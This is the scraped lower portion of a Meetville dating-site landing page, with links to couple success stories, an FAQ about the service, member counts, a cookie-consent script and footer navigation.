<div class="success-stories-section">
<picture class="success-stories-section__photo">
<source media="(min-resolution: 100dpi) " srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/photo_2018-01-30_17-08-22.jpg" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/photo_2018-01-30_17-08-22.jpg" data-load-priority="2" type="image/jpeg">
<source srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/photo_2018-01-30_17-08-22.jpg" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/photo_2018-01-30_17-08-22.jpg" data-load-priority="2" type="image/jpeg">
<img src="../mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/photo_2018-01-30_17-08-22.jpg" loading="lazy" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/photo_2018-01-30_17-08-22.jpg" data-load-priority="2" alt="Meetville Couples: The Story of Sofia and Will">
</picture>
<div class="success-stories-section__container">
<p class="success-stories-section__title">Meetville Couples: The Story of Sofia and Will</p>
<p class="success-stories-section__text"></p>
</div>
</div>
</a>
</li>
<li class="success-stories-list__item" role="none">
<a href="blog/couples/meetville-couples-story-louise-todd.html" target="_blank" title="Meetville Couples: The Story of Louise and Todd">
<div class="success-stories-section">
<picture class="success-stories-section__photo">
<source media="(min-resolution: 100dpi) " srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/04/imgonline-com-ua-Resize-GjNSpgYcYMWt.jpg" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/04/imgonline-com-ua-Resize-GjNSpgYcYMWt.jpg" data-load-priority="2" type="image/jpeg">
<source srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/04/imgonline-com-ua-Resize-GjNSpgYcYMWt.jpg" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/04/imgonline-com-ua-Resize-GjNSpgYcYMWt.jpg" data-load-priority="2" type="image/jpeg">
<img src="../mtvl-seo-img.s3.amazonaws.com/blog-images/2018/04/imgonline-com-ua-Resize-GjNSpgYcYMWt.jpg" loading="lazy" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/04/imgonline-com-ua-Resize-GjNSpgYcYMWt.jpg" data-load-priority="2" alt="Meetville Couples: The Story of Louise and Todd">
</picture>
<div class="success-stories-section__container">
<p class="success-stories-section__title">Meetville Couples: The Story of Louise and Todd</p>
<p class="success-stories-section__text"></p>
</div>
</div>
</a>
</li>
<li class="success-stories-list__item" role="none">
<a href="blog/couples/meetville-couples-story-diane-justin.html" target="_blank" title="Meetville Couples: The Story of Diane and Justin">
<div class="success-stories-section">
<picture class="success-stories-section__photo">
<source media="(min-resolution: 100dpi) " srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/10/imgonline-com-ua-Resize-tt57HArrpOCV5IL.jpg" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/10/imgonline-com-ua-Resize-tt57HArrpOCV5IL.jpg" data-load-priority="2" type="image/jpeg">
<source srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/10/imgonline-com-ua-Resize-tt57HArrpOCV5IL.jpg" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/10/imgonline-com-ua-Resize-tt57HArrpOCV5IL.jpg" data-load-priority="2" type="image/jpeg">
<img src="../mtvl-seo-img.s3.amazonaws.com/blog-images/2018/10/imgonline-com-ua-Resize-tt57HArrpOCV5IL.jpg" loading="lazy" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/10/imgonline-com-ua-Resize-tt57HArrpOCV5IL.jpg" data-load-priority="2" alt="Meetville Couples: The Story of Diane and Justin">
</picture>
<div class="success-stories-section__container">
<p class="success-stories-section__title">Meetville Couples: The Story of Diane and Justin</p>
<p class="success-stories-section__text"></p>
</div>
</div>
</a>
</li>
<li class="success-stories-list__item" role="none">
<a href="blog/couples/meetville-couples-story-wendy-rob.html" target="_blank" title="Meetville Couples: The Story of Wendy and Rob">
<div class="success-stories-section">
<picture class="success-stories-section__photo">
<source media="(min-resolution: 100dpi) " srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2019/05/imgonline-com-ua-Resize-NF32OXMuHua.jpg" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2019/05/imgonline-com-ua-Resize-NF32OXMuHua.jpg" data-load-priority="2" type="image/jpeg">
<source srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2019/05/imgonline-com-ua-Resize-NF32OXMuHua.jpg" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2019/05/imgonline-com-ua-Resize-NF32OXMuHua.jpg" data-load-priority="2" type="image/jpeg">
<img src="../mtvl-seo-img.s3.amazonaws.com/blog-images/2019/05/imgonline-com-ua-Resize-NF32OXMuHua.jpg" loading="lazy" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2019/05/imgonline-com-ua-Resize-NF32OXMuHua.jpg" data-load-priority="2" alt="Meetville Couples: The Story of Wendy and Rob">
</picture>
<div class="success-stories-section__container">
<p class="success-stories-section__title">Meetville Couples: The Story of Wendy and Rob</p>
<p class="success-stories-section__text"></p>
</div>
</div>
</a>
</li>
</ul>
</div>
<section class="about wrapper">
<h2 class="heading">#1 Trusted Online Dating Site</h2>
<div class="container" itemscope itemtype="https://schema.org/FAQPage">
<div class="left">
<div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question">
<h3 itemprop="name">What is Meetville?</h3>
<div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
<p itemprop="text">Meetville is a dating site developed for helping <a href="catalog/us.html">local singles</a> to find their soulmate. Meetville is an innovative way for local men and women to meet people for a successful, long-lasting and happy relationship. Our service welcomes everyone who's craving love!</p>
</div>
</div>
<div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question">
<h3 itemprop="name">Is Meetvillle free?</h3>
<div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
<p itemprop="text">Meetville has an opportunity to use a basic set of functions for free. You can send and receive winks, perform people searches, view users' profiles, view and post photos just for free. According to the research, singles who send as many gifts and winks as possible are more successful and likely to find their partner.</p>
</div>
</div>
<div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question">
<h3 itemprop="name">Who is a typical Meetville user?</h3>
<div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
<p itemprop="text">Meetville opens its heart for each and everyone who is looking for love. People of all ages, gender, skin color, religion and race have an opportunity to meet the right person in our service. Despite Meetville demonstrates a great number of profiles, it's quite nice and easy to select a profile since our users provide detailed information about their interests, hobbies, views, attitudes and personal facts in general.</p>
</div>
</div>
</div>
<div class="right">
<div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question">
<h3 itemprop="name">Where to get free dating advice?</h3>
<div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
<p itemprop="text">Don't miss the latest news while checking on our Meetville blog to receive some dating advice! You'll get much beneficial information on presenting yourself online, starting conversations with people of many interests, and so much more!</p>
</div>
</div>
<div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question">
<h3 itemprop="name">Is it possible to find people nearby?</h3>
<div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
<p itemprop="text">Our dating site is well-optimized by providing an opportunity to meet a <a href="catalog/us/man.html">single man</a> or <a href="catalog/us/woman.html">woman near your</a> location. With the help of different factors (profile information, replies to the questions) and matchmaking algorithms, our system demonstrates profiles that not only match your preferences but also depending on the location you indicate. Moreover, don't forget to set the appropriate distance to find people nearby!</p>
</div>
</div>
<div itemprop="mainEntity" itemscope itemtype="https://schema.org/Question">
<h3 itemprop="name">What if a user has service-related issues?</h3>
<div itemprop="acceptedAnswer" itemscope itemtype="https://schema.org/Answer">
<p itemprop="text">We have a strong team of customer support representatives who are ready to assist you as quickly as possible. If you have any questions regarding the service, billing details, or personal experience, please do not hesitate to contact us via the email <a href="cdn-cgi/l/email-protection.html#71020401011e0305311c14140507181d1d145f121e1c"><span class="__cf_email__" data-cfemail="d2a1a7a2a2bda0a692bfb7b7a6a4bbbebeb7fcb1bdbf">[email&#160;protected]</span></a>. You will be provided with a detailed reply within 24 hours. We work 365 days a year to have all your issues resolved. Meetville customer support group is client-oriented, competent, and responsible for your positive experience. Our main priority is the wellbeing of our customers.</p>
</div>
</div>
</div>
</div>
<a id="button_text_lp" class="button button_blue text_block_lp_button" href="https://m.meetville.com/?utm_source=landing&amp;utm_campaign=join-now">JOIN NOW!</a></section> <div class="container bg-gray-100">
<div class="row">
<section class="status">
<div class="status-block bg-white">
<div class="status-block__count">49,357,645</div>
<p class="status-block__text">people have already joined Meetville to find couple</p>
<a href="https://m.meetville.com/?utm_source=landing&amp;utm_campaign=browse-profiles" title="Browse Profiles" rel="nofollow" target="_self" class="people-info__link" style="margin: 0 auto; max-width: 250px; width: auto">Browse Profiles</a>
</div>
<div class="status-block bg-white">
<div class="status-block__count status-block__count--blue">177,684</div>
<p class="status-block__text">Online <strong>NOW!</strong></p>
<a href="https://m.meetville.com/?utm_source=landing&amp;utm_campaign=find-my-match" title="Find My Match" rel="nofollow" target="_self" class="people-item__btn" style="margin: 0 auto; max-width: 250px; width: auto">Find My Match</a>
</div>
</section>
</div>
</div>
<section id="cookie_popup">
<div>If you continue to browse it means you agree to the use of cookies. Learn more and change <a href="cookie.html" target="_blank">cookie settings</a>.</div>
<i id="hideCookePopup" class="close_icon"></i>
</section>
<script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    function hideCookePopup() {
        var CookieDate = new Date;
        CookieDate.setFullYear(CookieDate.getFullYear( ) +10);
        document.cookie = "cookiesPopup=1; expires=" + CookieDate.toGMTString( ) + ";";
        document.getElementById('cookie_popup').style.display = 'none';
    };

    document.getElementById("hideCookePopup").addEventListener("click", hideCookePopup);

    if (document.cookie.split(';').filter(function (item) {
            return item.indexOf('cookiesPopup=1') >= 0
        }).length) {
        document.getElementById('cookie_popup').style.display = 'none';
    }

    function checkEnableCookie() {
        document.cookie = "checkCookie=1";

        return document.cookie.indexOf('checkCookie') > -1;
    }
    if (checkEnableCookie() && document.cookie.indexOf('cookiesPopup') < 0) {
        document.getElementById('cookie_popup').style.display = 'flex';
    }

</script>
<div class="container bg-black-300">
<div class="information-row">
<div class="information-column">
<section class="information">
<div class="information-nav">
<ul class="information-nav__list-column">
<li class="information-nav__item">
<span class="information-nav__link"><b>Locals</b></span>
</li>
<li class="information-nav__item">
<a href="catalog/us/page/1423-japan.html" class="information-nav__link">Japanese Dating</a>
</li>
<li class="information-nav__item">
<a href="catalog/us/page/667-widowed.html" class="information-nav__link">Single Widows & Widowers</a>
</li>
<li class="information-nav__item">
<a href="catalog/us/page/2426-black-over-50-s.html" class="information-nav__link">Black Singles Over-50’s</a>
</li>
</ul>
</div>
</section>
</div>
<div class="information-column">
<section class="information">
<div class="information-nav">
<ul class="information-nav__list-column">
<li class="information-nav__item">
<span class="information-nav__link"><b>Women in US</b></span>
</li>
<li class="information-nav__item">
<a href="catalog/us/page/427-old-rich/woman.html" class="information-nav__link">Rich Older Women Dating</a>
</li>
<li class="information-nav__item">
<a href="catalog/us/page/1431-cougar.html" class="information-nav__link">Single Cougar Women</a>
</li>
<li class="information-nav__item">
<a href="catalog/us/page/379-indian/woman.html" class="information-nav__link">Single Indian Women</a>
</li>
</ul>
</div>
</section>
</div>
<div class="information-column">
<section class="information">
<div class="information-nav">
<ul class="information-nav__list-column">
<li class="information-nav__item">
<a class="information-nav__link"><b>Chat rooms</b></a>
</li>
<li class="information-nav__item">
<a href="catalog/us/page/5293-international-chat-rooms.html" class="information-nav__link">International Chat</a>
</li>
<li class="information-nav__item">
<a href="catalog/us/page/5573-christian-chat.html" class="information-nav__link">Christian Chat</a>
</li>
<li class="information-nav__item">
<a href="catalog/us/page/5298-indian-chat-room.html" class="information-nav__link">Indian Chat</a>
</li>
</ul>
</div>
</section>
</div>
</div>
</div>
<div class="container bg-black-300">
<div class="row">
<section class="information">
<div class="information-nav">
<ul class="information-nav__list">
<li class="information-nav__item">
<a href="about.html" class="information-nav__link">About Meetville</a>
</li>
<li class="information-nav__item">
<a href="blog.html" class="information-nav__link">Blog</a>
</li>
<li class="information-nav__item">
<a href="policy.html" class="information-nav__link">Privacy Policy</a>
</li>
<li class="information-nav__item">
<a href="cookie.html" class="information-nav__link">Cookie Policy</a>
</li>
<li class="information-nav__item">
<a href="terms.html" class="information-nav__link">Terms of Use</a>
</li>
<li class="information-nav__item">
<a href="safety.html" class="information-nav__link">Security & Compliance</a>
</li>
<li class="information-nav__item">
<a href="scams.html" class="information-nav__link">Scam Warning</a>
</li>
<li class="information-nav__item">
<a href="feedback.html" class="information-nav__link">Contact Us</a>
</li>
</ul>
</div>
<div class="information-container">
<div class="information-social">
<div class="information-social__wrapper">
<h5 class="information-social__title">Follow Us:</h5>
<ul class="information-social__list">
<li class="information-social__item">
<a href="https://www.facebook.com/Meetville/" rel="noopener" class="information-social__link information-social__link--facebook" title="Follow Meetville on Facebook" target="_blank"></a>
</li>
<li class="information-social__item">
<a href="https://twitter.com/Meetville" rel="noopener" class="information-social__link information-social__link--twitter" title="Follow Meetville on Twitter" target="_blank"></a>
</li>
<li class="information-social__item">
<a href="https://www.instagram.com/meetville_cityoflove/" rel="noopener" class="information-social__link information-social__link--instagram" title="Follow Meetville on Instagram" target="_blank"></a>
</li>
<li class="information-social__item">
<a href="https://www.pinterest.co.uk/meetville" rel="noopener" class="information-social__link information-social__link--pinterest" title="Follow Meetville on Pinterest" target="_blank"></a>
</li>
</ul>
</div>
</div>
</div>
</section>
</div>
</div>
<footer class="container bg-black">
<div class="row">
<div class="footer">
<p class="footer__text">© 2010 - 2024 Avanta Inc.</p>
</div>
</div>
</footer>
</main>
<script src="seoassets/30.06.2020/js/jquery.3.5.17e0c.js?v=0.1" defer></script>
<script src="seoassets/30.06.2020/js/owl.carousel7e0c.js?v=0.1" defer></script>
<script src="seoassets/30.06.2020/js/page5d17.js?v=0.11" defer></script>
<script src="seoassets/30.06.2020/js/sms5d17.js?v=0.11" defer></script>

</body>


</html>
